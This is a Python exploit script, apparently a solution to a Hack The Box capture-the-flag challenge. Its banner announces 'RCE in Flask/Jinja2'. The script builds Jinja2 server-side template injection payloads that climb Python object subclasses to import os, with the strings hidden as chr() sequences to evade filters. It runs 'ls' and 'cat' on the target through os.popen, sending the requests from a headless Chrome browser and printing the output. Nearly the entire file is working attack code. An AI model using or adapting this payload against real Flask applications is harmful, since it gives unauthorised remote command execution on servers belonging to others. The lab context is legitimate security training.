#!/usr/bin/env python3
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import re

green = '\033[92m'
red = '\033[91m'
end = '\033[0m'
    

parser = argparse.ArgumentParser()
parser.add_argument('-u', help='url', dest='url')

args = parser.parse_args()


def banner():
    print ('''%s
HTB                                                                                             
                                  -.-.-.-.-.-.-.-..                                      ....-.     
                                 :ososososososoooo-                                     /ososo/     
                         .-:-----::::::-:-:-:-:-:------:-:-:-`                        `-:::::       
                        `+o+oo+o+o+o+o+o+o+o+o+oo+o+o+o+o+o++                         /+o+o+:       
                   ::::::/:/:/::::::/:/:/:/:/:/:/::::::/:/:/:::::.                  .:/:/::         
                  -/+/+/+/++++++/o/o/o/+/+/+/++++++/+/o/o/+/+/+/+`                  /+++++.         
                 //+:+////////////////+//////////////////+:+//////://:            ::////:           
                -:+:+/+:+/+////+/+:+:+:+:+:+/+////+/+/+:+:+:+:+/+////`           `:+////`           
            .+++++/+/+/+/+/+/+/++++++/+/+/+/+/+/+/+/++++/+/+/+/+/+/+/+//        //+/+/-             
            ::/:/-/-/-/:/:/://:/:/:/:/-/-/:/:/://:/:/:/:/-/-/-/:/:/::/:`       .-/:/:/              
          -+o+o+oo+o+o+o+o+o+o+o+o+oo+o+o+o+o+o+o+o+o+oo+o+o+o+o+o+o+o+o+/      ++o+-               
          -::-:-:-:-:-:-:-:-::::-:-:-:-:-:-:-:-::::-:-:-:-:-:-:-:-::::-:-`     `-:-:                
          :ososoooosooooosososososoooooooooososososososoooosooososososososo+    +o.                 
          ------:-:-:-:-:-:------:-:-:-:-:-:-:------:-:-:-:-:-:-:------:-:.`   `.-                  
        /osososososssssossososososososssosossososososososssssossososososo+                          
        .---------------------------------------------------------------.`                          
        +osososososssososossososososososososossssososososssososossssoso/                            
        `.``.`.`.`.`.`.`.`.`.``.`.`.`.`.`..-..`.``.`.-----------------`     ``                      
                                         `oo`       :ososososososooso-     .o+                      
               .-.-                 .-.-.:``        ``````.---------`     .---                      
              .o-o.                .o-+-+-                .oooooooo.     -oso+                      
              .```                 ```.`.                 `------.`     ------                      
                                                          .+ooooo`     :+s+s++                      
                                                       :-:-::::.`    `-:::::`                       
                                                      :+o+o+o++`     /+o+o+:                        
          .::::::/:                     ::/:/:/:/::::::/:/:/:`     .::::::::                        
          /++++/o/:                    ./o/o/++++++++/o/o/o//      /++++/o/:                        
          ./////////:/:/:/://////////////:/:/:/://////////:`     -://////:                          
          :///+:+:+:+:+:+:+//////+:+:+:+:+:+/+////////+:+::      ://///+/.                          
              `+++++/+/+/+/+/++++++++++/+/+/+/+/+/++++++/      :/+/+/++/                            
              -:/:/:/:/:/:/://:/:/:/:/:/:/:/:/://:/:/:/:.     `:/:/::/:`                            
                `o+o+o+o+o+o+o+o+o+oo+o+o+o+o+o+o+o+o+/   `++o+o+o+-                                
                --:-:-:-::::::::::-:-:-:-:-:::::--:-:-`   .-:-:-:-:                                 
                    `ooooooooooooooooooooooooo-           `oooo.                                    
                    `.-.-.-----:-:-:-:-:-:----       `    `.---` ```                                
                           /ososososoooooooo.        o      `+ooooo-                                
                         ``--------:-:.:.---`      ` -      `.-----`````                            
                         +osososososossosooo.      o        `ossosososo/                            
                     ```.-----------.-.-.-..```    .       `..---------`                            
                    `ossssssssososososssssssss.           `ossssssssoso/                            
                   ..---------------``````````  `..........--------.```                             
                  -ososossssssososo/            +ososoyosososososss.                                
                      `.----------        .`    `----------------.                                  
                      `+sosossoso:        /.    +osososososososos`                                  
                           .-:-:--      -`      `-:----:-:-:-:-:-:--                                
                           +oo+o+-      +`      +oo+o+o+o+o+s+s+o+o`                                
                         -:/:/::::/:/:        .:/:/::::/:/:/:/:/:/:/::::                            
                        `/+/++++/+/+/:        /++++/+/+/+/+/+/o/+/++++/.                            
        -////////+/+/+///+/+////////+/+/+///+/+/+//////+/+/+///+/+/+////////+/+///+/+/+////////     
        /////:/:+:+:/:/:/://////:/:+:+:+:/:/:////////:+:+:+:/:+:/://////:+:+:+:/:/:/://////:+:-     
                                                                                                    
RCE in Flask/Jinja2
-u for "URL"                                                                          
%s''' % (red,end))

banner()

def gen_payload(arg):
    payload = ""
    chr_builtins = "chr(95)%2bchr(95)%2bchr(98)%2bchr(117)%2bchr(105)%2bchr(108)%2bchr(116)%2bchr(105)%2bchr(110)%2bchr(115)%2bchr(95)%2bchr(95)"
    chr_import = "chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)"
    chr_flask = "chr(102)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(107)"
    chr_os = "chr(111)%2bchr(115)"
    chr_cat_flag = "chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(95)%2bchr(80)%2bchr(53)%2bchr(52)%2bchr(101)%2bchr(100)"
    chr_ls = "chr(108)%2bchr(115)"
    setchar = '{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}'
    setflask = '{% set flask=().__class__.__base__.__subclasses__()[59].__init__.__globals__['+chr_builtins+']['+chr_import+']('+chr_flask+') %}'
    define_os = '{% set os=().__class__.__base__.__subclasses__()[59].__init__.__globals__['+chr_builtins+']['+chr_import+']('+chr_os+') %}'
    payloadls = '{% set a=flask.abort(flask.Response(os.popen('+chr_ls+').read())) %}'
    payloadcat = '{% set a=flask.abort(flask.Response(os.popen('+chr_cat_flag+').read())) %}'
    if arg == 1:
        payload = setchar + setflask + define_os + payloadls
    else:
        payload = setchar + setflask + define_os + payloadcat
    return payload

if not args.url:
    print("please use - u for http://url")
else:
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument('--headless')
    driver = webdriver.Chrome(options=chrome_options)

    driver.get(args.url+gen_payload(1))
    print("Listing directory....")
    s = driver.find_element_by_css_selector("body")
    print(s.get_attribute('innerHTML'))
    print("Capturing the Flag....")
    driver.get(args.url+gen_payload(2))
    s = driver.find_element_by_css_selector("body")
    print(s.get_attribute('innerHTML'))